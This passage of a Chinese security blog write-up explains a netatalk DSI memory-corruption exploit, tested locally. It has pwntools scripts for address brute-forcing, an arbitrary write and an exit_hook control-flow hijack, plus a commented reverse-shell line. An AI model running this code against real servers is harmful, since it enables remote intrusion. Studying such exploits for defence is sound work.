<p>该地址和libc地址比较相近，所以段基址都是4k页对齐，爆两个字节，最差65536次就可以了</p>
<p>从低位开始，依次覆盖commands指针的各个字节。当修改后的commands指针是一个可写的地址时，dsi_opensession()函数可以将server_quantum的值放进来并返回给我们，否则，子进程会由于访问不可写的地址而崩溃，socket异常。故，可以通过观察服务器是否给我们返回来确定当前我们是否爆破出一个合法的地址。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boom</span>():</span></span><br><span class="line">    leak = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span>(j&gt;<span class="number">2</span> <span class="keyword">and</span> j&lt;<span class="number">6</span>): i = <span class="number">255</span> - i</span><br><span class="line">            io = remote(ip,port)</span><br><span class="line">            payload  = <span class="string">b&#x27;\x01&#x27;</span>+ p8(<span class="number">0x11</span>+j)+ <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + leak + p8(i)</span><br><span class="line">            io.send(create_dsi(payload))</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                a = io.recv()</span><br><span class="line">                leak += p8(i)</span><br><span class="line">                log.success(<span class="built_in">str</span>(<span class="built_in">hex</span>(i)))</span><br><span class="line">                io.close()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                io.close()</span><br><span class="line">    <span class="keyword">return</span> u64(leak)</span><br><span class="line"></span><br><span class="line">leak_addr = boom()</span><br></pre></td></tr></table></figure>

<p>至于为什么3-6位从0xff到0x00爆是为了计算偏移时方便一点，结果更接近libc_base，且地址较高</p>
<p><img src="https://s2.loli.net/2022/01/07/bH52kwvjndYIe3p.png" alt="image-20220107165016414"></p>
<p><img src="https://s2.loli.net/2022/01/07/aUCnvpiJg2L6So4.png" alt="image-20220107165049214"></p>
<p>在本地测试的方便之处在于可以很方便地找到libc基址，可是远程就没那么容易了，不知道机器版本的情况跨如何知道具体偏移呢，可以先在本地测试攻击方法，本地成功之后再远程爆破，直到远程成功为止</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">leak_addr = <span class="number">0x7f5f3d138000</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x0000000</span>,<span class="number">0xffff000</span>,<span class="number">0x1000</span>):</span><br><span class="line">    libc_addr = leak_addr - i </span><br></pre></td></tr></table></figure>

<p>为了方便，本文只在本地进行测试，所以假设现在已经拥有了libc基址，可以控制commands，下一步利用任意写漏洞，</p>
<p>漏洞点2：</p>
<p><strong>dsi_stream_receive()</strong></p>
<p>该函数从当前socket继续读取消息并保存在结构体中。具体地，先读取DSI header并保存到dsi-&gt;header结构体中，然后读取后续DSI payload保存到dsi-&gt;commands指向的buffer当中，长度由dsi-&gt;cmdlen指定。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dsi_stream_receive</span><span class="params">(DSI *dsi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> block[DSI_BLOCKSIZ];</span><br><span class="line"></span><br><span class="line">  LOG(log_maxdebug, logtype_dsi, <span class="string">&quot;dsi_stream_receive: START&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dsi-&gt;flags &amp; DSI_DISCONNECTED)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* read in the header */</span></span><br><span class="line">  <span class="keyword">if</span> (dsi_buffered_stream_read(dsi, (<span class="keyword">uint8_t</span> *)block, <span class="keyword">sizeof</span>(block)) != <span class="keyword">sizeof</span>(block)) </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  dsi-&gt;header.dsi_flags = block[<span class="number">0</span>];</span><br><span class="line">  dsi-&gt;header.dsi_command = block[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dsi-&gt;header.dsi_command == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_requestID, block + <span class="number">2</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_requestID));</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_data.dsi_doff, block + <span class="number">4</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_data.dsi_doff));</span><br><span class="line">  dsi-&gt;header.dsi_data.dsi_doff = htonl(dsi-&gt;header.dsi_data.dsi_doff);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_len, block + <span class="number">8</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_len));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_reserved, block + <span class="number">12</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_reserved));</span><br><span class="line">  dsi-&gt;clientID = ntohs(dsi-&gt;header.dsi_requestID);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* make sure we don&#x27;t over-write our buffers. */</span></span><br><span class="line">  dsi-&gt;cmdlen = MIN(ntohl(dsi-&gt;header.dsi_len), dsi-&gt;server_quantum);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Receiving DSIWrite data is done in AFP function, not here */</span></span><br><span class="line">  <span class="keyword">if</span> (dsi-&gt;header.dsi_data.dsi_doff) &#123;</span><br><span class="line">      LOG(log_maxdebug, logtype_dsi, <span class="string">&quot;dsi_stream_receive: write request&quot;</span>);</span><br><span class="line">      dsi-&gt;cmdlen = dsi-&gt;header.dsi_data.dsi_doff;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 将header之后的payload读取到commands指向的内存中 */</span></span><br><span class="line">  <span class="keyword">if</span> (dsi_stream_read(dsi, dsi-&gt;commands, dsi-&gt;cmdlen) != dsi-&gt;cmdlen)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  LOG(log_debug, logtype_dsi, <span class="string">&quot;dsi_stream_receive: DSI cmdlen: %zd&quot;</span>, dsi-&gt;cmdlen);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> block[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>谈一下后续流程，commands通过一个定义在etc/afpd/switch.c名叫<code>afp_switch</code>的全局跳转表指针（指向具有255个项的跳转表）来在系统中传递。跳转表中每一个项要么是NULL（表示没有实现），要么是一个函数（用于处理<code>commands</code>里的AFP数据）。</p>
<p>读取完毕后若<code>cmd=2(DSIFUNC_CMD)</code>，则以<code>dsi-&gt;commands[0]</code>为索引，<code>err = (*afp_switch[function])(obj,(char *)dsi-&gt;commands, dsi-&gt;cmdlen,(char *)&amp;dsi-&gt;data, &amp;dsi-&gt;datalen);</code>，调用afp_switch函数表的指针。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function = (u_char) dsi-&gt;commands[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span> (afp_switch[function]) &#123;</span><br><span class="line">    err = (*afp_switch[function])(obj,</span><br><span class="line">            (<span class="keyword">char</span> *)dsi-&gt;commands, dsi-&gt;cmdlen,</span><br><span class="line">            (<span class="keyword">char</span> *)&amp;dsi-&gt;data, &amp;dsi-&gt;datalen);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    LOG(log_maxdebug, logtype_afpd, <span class="string">&quot;bad function %X&quot;</span>, function);</span><br><span class="line">    dsi-&gt;datalen = <span class="number">0</span>;</span><br><span class="line">    err = AFPERR_NOOP;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>afp_switch</code>指向两种跳转表中的一个。一个名叫<code>preauth_switch</code>，它包含了未认证用户仅能调用的四个函数，<code>preauth_switch</code>也是默认的<code>afp_switch</code>表。另一个名叫<code>postauth_switch</code>，当用户进行认证后，它被换入到<code>afp_switch</code>中。</p>
<p>这里的结构是这样的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">AFPCmd *afp_switch = preauth_switch;</span><br><span class="line"></span><br><span class="line">AFPCmd postauth_switch[] = &#123;</span><br><span class="line">    <span class="literal">NULL</span>, afp_bytelock, afp_closevol, afp_closedir,</span><br><span class="line">    afp_closefork, afp_copyfile, afp_createdir, afp_createfile,	<span class="comment">/*   0 -   7 */</span></span><br><span class="line">    afp_delete, afp_enumerate, afp_flush, afp_flushfork,</span><br><span class="line">    afp_null, afp_null, afp_getforkparams, afp_getsrvrinfo,	<span class="comment">/*   8 -  15 */</span></span><br><span class="line">    afp_getsrvrparms, afp_getvolparams, afp_login, afp_logincont,</span><br><span class="line">    afp_logout, afp_mapid, afp_mapname, afp_moveandrename,	<span class="comment">/*  16 -  23 */</span></span><br><span class="line">    afp_openvol, afp_opendir, afp_openfork, afp_read,</span><br><span class="line">    afp_rename, afp_setdirparams, afp_setfilparams, afp_setforkparams,</span><br><span class="line">    <span class="comment">/*  24 -  31 */</span></span><br><span class="line">    afp_setvolparams, afp_write, afp_getfildirparams, afp_setfildirparams,</span><br><span class="line">    afp_changepw, afp_getuserinfo, afp_getsrvrmesg, afp_createid, <span class="comment">/*  32 -  39 */</span></span><br><span class="line">    afp_deleteid, afp_resolveid, afp_exchangefiles, afp_catsearch,</span><br><span class="line">    afp_null, afp_null, afp_null, afp_null,			<span class="comment">/*  40 -  47 */</span></span><br><span class="line">    afp_opendt, afp_closedt, afp_null, afp_geticon,</span><br><span class="line">    afp_geticoninfo, afp_addappl, afp_rmvappl, afp_getappl,	<span class="comment">/*  48 -  55 */</span></span><br><span class="line">    afp_addcomment, afp_rmvcomment, afp_getcomment, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/*  56 -  63 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/*  64 -  71 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, afp_syncdir, afp_syncfork,	<span class="comment">/*  72 -  79 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/*  80 -  87 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/*  88 -  95 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    afp_getdiracl, afp_setdiracl, afp_afschangepw, <span class="literal">NULL</span>,	<span class="comment">/*  96 - 103 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 104 - 111 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 112 - 119 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 120 - 127 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 128 - 135 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 136 - 143 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 144 - 151 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 152 - 159 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 160 - 167 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 168 - 175 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 176 - 183 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 184 - 191 */</span></span><br><span class="line">    afp_addicon, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 192 - 199 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 200 - 207 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 208 - 215 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 216 - 223 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 224 - 231 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 232 - 239 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 240 - 247 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 248 - 255 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>有了dsi_stream_receive()，我们就可以先通过memcpy覆写dsi-&gt;commands指针，再通过<code>dsi_stream_read</code>实现任意地址写。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(endian=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">5566</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_dsi</span>(<span class="params">data</span>):</span></span><br><span class="line">    dsi  = <span class="string">b&#x27;\x00\x04\x00\x01&#x27;</span></span><br><span class="line">    dsi += p32(<span class="number">0</span>)</span><br><span class="line">    dsi += p32(<span class="built_in">len</span>(data),endian=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    dsi += p32(<span class="number">0</span>)</span><br><span class="line">    dsi += data</span><br><span class="line">    <span class="keyword">return</span> dsi</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send2</span>(<span class="params">io,addr,data</span>):</span></span><br><span class="line">    payload  = <span class="string">b&#x27;\x01&#x27;</span>+ p8(<span class="number">0x18</span>)+ <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(addr)</span><br><span class="line">    io.send(create_dsi(payload))</span><br><span class="line">    io.recv()</span><br><span class="line">    io.send(create_dsi(data))</span><br><span class="line">    </span><br><span class="line">leak_addr = <span class="number">0x7f5f3d138000</span></span><br><span class="line"><span class="comment"># 0x7f5f3d138000 - 0x817000</span></span><br><span class="line">raw_input()</span><br><span class="line">log.success(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">io = remote(ip,port)</span><br><span class="line">send2(io,leak_addr,<span class="string">&quot;deadbeef&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>查看内存，目标地址已被成功修改</p>
<p><img src="https://s2.loli.net/2022/01/07/HIhOEQa7ovAKfBe.png" alt="image-20220107171022664"></p>
<p>漏洞点3：</p>
<p>有了前两个条件，最后一步就可以进行精准打击了，free_hook可以的，之前hitcon2019用的方法就是freehook，这里用一种新学的方法，世人称之为exit_hook</p>
<p>这里简单记录一下原理，写个exit()的程序，跟进会知道它的具体流程</p>
<p><img src="https://s2.loli.net/2022/01/07/lNHKwUvLImrxWkT.png" alt="image-20220107174429000"></p>
<p><img src="https://s2.loli.net/2022/01/07/ly3ITJw9mXcpiOr.png" alt="image-20220107174612941"></p>
<p>这里的&lt;_dl_fini+105&gt;是rtld_lock_default_lock_recursive函数，rdi是_rtld_gobal+2312</p>
<p>看一下源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">   <span class="keyword">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line">  again:</span><br><span class="line"> <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">   <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns)</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">       __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line"> </span><br><span class="line">       <span class="keyword">unsigned</span> <span class="keyword">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">       <span class="comment">/* No need to do anything for empty namespaces or those used for</span></span><br><span class="line"><span class="comment">      auditing DSOs.  */</span></span><br><span class="line">       <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">       || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line"> <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">     __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/01/07/8o3jHzeifsOq4S6.png" alt="image-20220107183237588"></p>
<p>调用了两个关键的函数，如上，这两个函数在_rtld_global结构体里面，也就是说如果我们能改写这两个函数其中一个就能控制流劫持并控制参数</p>
<p>函数指针：_dl_rtld_lock_recursive (_rtld_global+3840)</p>
<p>调用参数：_dl_load_lock (_rtld_global+2312)</p>
<p><img src="https://s2.loli.net/2022/01/07/CiS6FrvEe2DWUgt.png" alt="image-20220107183731986"></p>
<p>所以只要有一次任意地址写大小0x600字节就可以</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(endian=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">5566</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_dsi</span>(<span class="params">data</span>):</span></span><br><span class="line">    dsi  = <span class="string">b&#x27;\x00\x04\x00\x01&#x27;</span></span><br><span class="line">    dsi += p32(<span class="number">0</span>)</span><br><span class="line">    dsi += p32(<span class="built_in">len</span>(data),endian=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    dsi += p32(<span class="number">0</span>)</span><br><span class="line">    dsi += data</span><br><span class="line">    <span class="keyword">return</span> dsi</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send2</span>(<span class="params">io,addr,data</span>):</span></span><br><span class="line">    payload  = <span class="string">b&#x27;\x01&#x27;</span>+ p8(<span class="number">0x18</span>)+ <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(addr)</span><br><span class="line">    io.send(create_dsi(payload))</span><br><span class="line">    io.recv()</span><br><span class="line">    io.send(create_dsi(data))</span><br><span class="line"></span><br><span class="line">leak_addr = <span class="number">0x7f5f3c921000</span></span><br><span class="line"><span class="comment"># 0x7f5f3d138000 - 0x817000</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">raw_input()</span><br><span class="line">libc.address = leak_addr</span><br><span class="line">rtld = libc.address + <span class="number">0xed4060</span></span><br><span class="line"><span class="comment">#cmd = b&#x27;bash -c &quot;bash  -i&gt;&amp; /dev/tcp/ip/port 0&lt;&amp;1&quot;&#x27;</span></span><br><span class="line">cmd = <span class="string">&quot;cat /home/ld1ng/Desktop/netatalk/flag.txt&quot;</span></span><br><span class="line"><span class="comment"># cmd = &quot;/bin/zsh&quot;</span></span><br><span class="line">io = 